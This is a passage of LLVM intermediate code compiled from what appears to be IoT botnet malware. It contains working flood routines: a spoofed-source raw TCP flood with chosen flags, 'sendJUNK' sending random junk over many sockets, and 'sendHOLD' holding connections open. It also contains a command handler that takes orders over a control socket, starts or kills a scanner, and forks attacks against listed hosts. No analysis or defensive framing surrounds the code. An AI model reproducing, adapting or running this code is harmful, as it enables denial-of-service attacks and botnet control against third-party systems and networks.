  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i64 0, i64 0)) #15
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %.preheader

.preheader:                                       ; preds = %32
  %63 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:65:                                     ; preds = %32
  %66 = and i16 %58, -8177
  %67 = or i16 %66, 8016
  store i16 %67, i16* %57, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge77
  %68 = phi i8* [ %83, %.backedge77 ], [ %63, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #15
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #15
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #15
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %.backedge77

.backedge77:                                      ; preds = %80, %.sink.split
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %85 = load i16, i16* %57, align 16
  %86 = and i16 %85, %.sink7
  %87 = or i16 %86, %.sink5
  store i16 %87, i16* %57, align 16
  br label %.backedge77

.loopexit.loopexit:                               ; preds = %.backedge77
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %65
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = getelementptr inbounds i8, i8* %39, i64 34
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = getelementptr inbounds i8, i8* %39, i64 36
  %93 = bitcast i8* %92 to i16*
  store i16 0, i16* %93, align 4
  %94 = getelementptr inbounds i8, i8* %39, i64 38
  %95 = bitcast i8* %94 to i16*
  store i16 0, i16* %95, align 2
  br i1 %11, label %96, label %98

; <label>:96:                                     ; preds = %.loopexit
  %97 = call i32 @rand_cmwc()
  br label %102

; <label>:98:                                     ; preds = %.loopexit
  %99 = trunc i32 %1 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #18
  %101 = zext i16 %100 to i32
  br label %102

; <label>:102:                                    ; preds = %98, %96
  %103 = phi i32 [ %97, %96 ], [ %101, %98 ]
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds i8, i8* %39, i64 22
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %107, i16* %93, align 4
  %108 = bitcast i8* %39 to i16*
  %109 = getelementptr inbounds i8, i8* %39, i64 2
  %110 = bitcast i8* %109 to i16*
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* nonnull %108, i32 %112)
  %114 = getelementptr inbounds i8, i8* %39, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %117 = add nsw i32 %116, %2
  %118 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %119 = getelementptr inbounds i8, i8* %39, i64 12
  %120 = bitcast i8* %119 to i32*
  %121 = getelementptr inbounds i8, i8* %39, i64 4
  %122 = bitcast i8* %121 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %102
  %.0 = phi i32 [ 0, %102 ], [ %.0.be, %.backedge.backedge ]
  %123 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %118, i32 16) #3
  %124 = call i32 @getRandomIP(i32 %.074)
  %125 = call i32 @htonl(i32 %124) #18
  store i32 %125, i32* %120, align 4
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %122, align 4
  %128 = call i32 @rand_cmwc()
  store i32 %128, i32* %53, align 8
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %50, align 4
  store i16 0, i16* %93, align 4
  %131 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %131, i16* %93, align 4
  %132 = load i16, i16* %110, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %108, i32 %133)
  store i16 %134, i16* %115, align 2
  %135 = icmp eq i32 %.0, %5
  br i1 %135, label %136, label %139

; <label>:136:                                    ; preds = %.backedge
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = icmp sgt i32 %137, %117
  br i1 %138, label %141, label %.backedge.backedge

; <label>:139:                                    ; preds = %.backedge
  %140 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %139, %136
  %.0.be = phi i32 [ %140, %139 ], [ 0, %136 ]
  br label %.backedge

; <label>:141:                                    ; preds = %136
  call void @llvm.stackrestore(i8* %38)
  br label %142

; <label>:142:                                    ; preds = %23, %18, %28, %141
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %6 to %struct.timeval*
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %92

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = bitcast i32* %8 to i8*
  br label %.preheader

.loopexit.loopexit:                               ; preds = %90
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %29, %36
  br i1 %37, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %90
  %indvars.iv = phi i64 [ %indvars.iv.next, %90 ], [ 0, %.lr.ph.preheader ]
  %38 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %39 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %40 = load i8, i8* %39, align 4
  switch i8 %40, label %90 [
    i8 0, label %41
    i8 1, label %56
    i8 2, label %79
  ]

; <label>:41:                                     ; preds = %.lr.ph
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  store i32 %42, i32* %43, align 8
  %44 = call i32 (i32, i32, ...) @fcntl(i32 %42, i32 3, i8* null) #3
  %45 = or i32 %44, 2048
  %46 = call i32 (i32, i32, ...) @fcntl(i32 %42, i32 4, i32 %45) #3
  %47 = call i32 @connect(i32 %42, %struct.sockaddr* nonnull %33, i32 16) #3
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %41
  %50 = tail call i32* @__errno_location() #18
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, 115
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %49, %41
  %54 = call i32 @close(i32 %42) #3
  br label %90

; <label>:55:                                     ; preds = %49
  store i8 1, i8* %39, align 4
  br label %90

; <label>:56:                                     ; preds = %.lr.ph
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #3, !srcloc !20
  %58 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  %59 = load i32, i32* %58, align 8
  %60 = srem i32 %59, 64
  %61 = zext i32 %60 to i64
  %62 = shl i64 1, %61
  %63 = sdiv i32 %59, 64
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %64
  %66 = load i64, i64* %65, align 8
  %67 = or i64 %62, %66
  store i64 %67, i64* %65, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %68 = add nsw i32 %59, 1
  %69 = call i32 @select(i32 %68, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %69, label %90 [
    i32 1, label %70
    i32 -1, label %77
  ]

; <label>:70:                                     ; preds = %56
  store i32 4, i32* %7, align 4
  %71 = call i32 @getsockopt(i32 %59, i32 1, i32 4, i8* nonnull %35, i32* nonnull %7) #3
  %72 = load i32, i32* %8, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %76, label %74

; <label>:74:                                     ; preds = %70
  %75 = call i32 @close(i32 %59) #3
  br label %76

; <label>:76:                                     ; preds = %70, %74
  %.sink = phi i8 [ 0, %74 ], [ 2, %70 ]
  store i8 %.sink, i8* %39, align 4
  br label %90

; <label>:77:                                     ; preds = %56
  %78 = call i32 @close(i32 %59) #3
  store i8 0, i8* %39, align 4
  br label %90

; <label>:79:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = call i64 @send(i32 %81, i8* %27, i64 1024, i32 16384) #3
  %83 = icmp eq i64 %82, -1
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %79
  %85 = tail call i32* @__errno_location() #18
  %86 = load i32, i32* %85, align 4
  %87 = icmp eq i32 %86, 11
  br i1 %87, label %90, label %88

; <label>:88:                                     ; preds = %84
  %89 = call i32 @close(i32 %81) #3
  store i8 0, i8* %39, align 4
  br label %90

; <label>:90:                                     ; preds = %56, %84, %.lr.ph, %55, %53, %77, %76, %88, %79
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %91 = icmp slt i64 %indvars.iv.next, %25
  br i1 %91, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %92

; <label>:92:                                     ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %6 to %struct.timeval*
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %97

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = bitcast i32* %8 to i8*
  br label %.preheader

.loopexit.loopexit:                               ; preds = %95
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %35 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %36 = icmp sgt i32 %28, %35
  br i1 %36, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %95
  %indvars.iv = phi i64 [ %indvars.iv.next, %95 ], [ 0, %.lr.ph.preheader ]
  %37 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %38 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %39 = load i8, i8* %38, align 4
  switch i8 %39, label %95 [
    i8 0, label %40
    i8 1, label %55
    i8 2, label %78
  ]

; <label>:40:                                     ; preds = %.lr.ph
  %41 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  store i32 %41, i32* %42, align 8
  %43 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 3, i8* null) #3
  %44 = or i32 %43, 2048
  %45 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 4, i32 %44) #3
  %46 = call i32 @connect(i32 %41, %struct.sockaddr* nonnull %32, i32 16) #3
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %40
  %49 = tail call i32* @__errno_location() #18
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %54, label %52

; <label>:52:                                     ; preds = %48, %40
  %53 = call i32 @close(i32 %41) #3
  br label %95

; <label>:54:                                     ; preds = %48
  store i8 1, i8* %38, align 4
  br label %95

; <label>:55:                                     ; preds = %.lr.ph
  %56 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !21
  %57 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  %58 = load i32, i32* %57, align 8
  %59 = srem i32 %58, 64
  %60 = zext i32 %59 to i64
  %61 = shl i64 1, %60
  %62 = sdiv i32 %58, 64
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %63
  %65 = load i64, i64* %64, align 8
  %66 = or i64 %61, %65
  store i64 %66, i64* %64, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %67 = add nsw i32 %58, 1
  %68 = call i32 @select(i32 %67, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %68, label %95 [
    i32 1, label %69
    i32 -1, label %76
  ]

; <label>:69:                                     ; preds = %55
  store i32 4, i32* %7, align 4
  %70 = call i32 @getsockopt(i32 %58, i32 1, i32 4, i8* nonnull %34, i32* nonnull %7) #3
  %71 = load i32, i32* %8, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %69
  %74 = call i32 @close(i32 %58) #3
  br label %75

; <label>:75:                                     ; preds = %69, %73
  %.sink = phi i8 [ 0, %73 ], [ 2, %69 ]
  store i8 %.sink, i8* %38, align 4
  br label %95

; <label>:76:                                     ; preds = %55
  %77 = call i32 @close(i32 %58) #3
  store i8 0, i8* %38, align 4
  br label %95

; <label>:78:                                     ; preds = %.lr.ph
  %79 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !22
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %37, i64 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = srem i32 %81, 64
  %83 = zext i32 %82 to i64
  %84 = shl i64 1, %83
  %85 = sdiv i32 %81, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = or i64 %84, %88
  store i64 %89, i64* %87, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %6, align 16
  %90 = add nsw i32 %81, 1
  %91 = call i32 @select(i32 %90, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %tmpcast) #3
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %95, label %93

; <label>:93:                                     ; preds = %78
  %94 = call i32 @close(i32 %81) #3
  store i8 0, i8* %38, align 4
  br label %95

; <label>:95:                                     ; preds = %55, %78, %.lr.ph, %54, %52, %76, %75, %93
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %96 = icmp slt i64 %indvars.iv.next, %25
  br i1 %96, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %97

; <label>:97:                                     ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i64 0, i64 0))
  br label %347

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %15)
  br label %347

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %51

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i64 0, i64 0))
  br label %347

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %37

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %347, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #3
  %35 = load i32, i32* @mainCommSock, align 4
  %36 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %35, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  %.pre = load i8*, i8** %26, align 8
  br label %37

; <label>:37:                                     ; preds = %25, %33
  %38 = phi i8* [ %27, %25 ], [ %.pre, %33 ]
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i64 0, i64 0)) #15
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %._crit_edge

._crit_edge:                                      ; preds = %37
  %.pre203 = load i8*, i8** %1, align 8
  br label %51

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* @scanPid, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %347

; <label>:44:                                     ; preds = %41
  %45 = tail call i32 @fork() #3
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %48, label %47

; <label>:47:                                     ; preds = %44
  store i32 %45, i32* @scanPid, align 4
  br label %347

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i64 0, i64 0))
  tail call void @StartTheLelz()
  unreachable

; <label>:51:                                     ; preds = %._crit_edge, %17
  %52 = phi i8* [ %.pre203, %._crit_edge ], [ %3, %17 ]
  %53 = tail call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i64 0, i64 0)) #15
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %.loopexit186

; <label>:55:                                     ; preds = %51
  %56 = icmp slt i32 %0, 4
  br i1 %56, label %347, label %57

; <label>:57:                                     ; preds = %55
  %58 = getelementptr inbounds i8*, i8** %1, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #15
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %347, label %62

; <label>:62:                                     ; preds = %57
  %63 = getelementptr inbounds i8*, i8** %1, i64 3
  %64 = load i8*, i8** %63, align 8
  %65 = tail call i32 @atoi(i8* %64) #15
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %347, label %67

; <label>:67:                                     ; preds = %62
  %68 = getelementptr inbounds i8*, i8** %1, i64 1
  %69 = load i8*, i8** %68, align 8
  %strchr = tail call i8* @strchr(i8* %69, i32 44)
  %70 = icmp eq i8* %strchr, null
  br i1 %70, label %77, label %.preheader185.preheader

.preheader185.preheader:                          ; preds = %67
  br label %.preheader185

.preheader185:                                    ; preds = %.preheader185.preheader, %73
  %.sink = phi i8* [ null, %73 ], [ %69, %.preheader185.preheader ]
  %71 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %72 = icmp eq i8* %71, null
  br i1 %72, label %.loopexit186.loopexit, label %73

; <label>:73:                                     ; preds = %.preheader185
  %74 = tail call i32 @listFork()
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %.preheader185

; <label>:76:                                     ; preds = %73
  tail call void @sendHOLD(i8* nonnull %71, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:77:                                     ; preds = %67
  %78 = tail call i32 @listFork()
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %347

; <label>:80:                                     ; preds = %77
  tail call void @sendHOLD(i8* %69, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit186.loopexit:                            ; preds = %.preheader185
  %.pre204 = load i8*, i8** %1, align 8
  br label %.loopexit186

.loopexit186:                                     ; preds = %.loopexit186.loopexit, %51
  %81 = phi i8* [ %.pre204, %.loopexit186.loopexit ], [ %52, %51 ]
  %82 = tail call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i64 0, i64 0)) #15
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %.loopexit184

; <label>:84:                                     ; preds = %.loopexit186
  %85 = icmp slt i32 %0, 4
  br i1 %85, label %347, label %86

; <label>:86:                                     ; preds = %84
  %87 = getelementptr inbounds i8*, i8** %1, i64 2
  %88 = load i8*, i8** %87, align 8
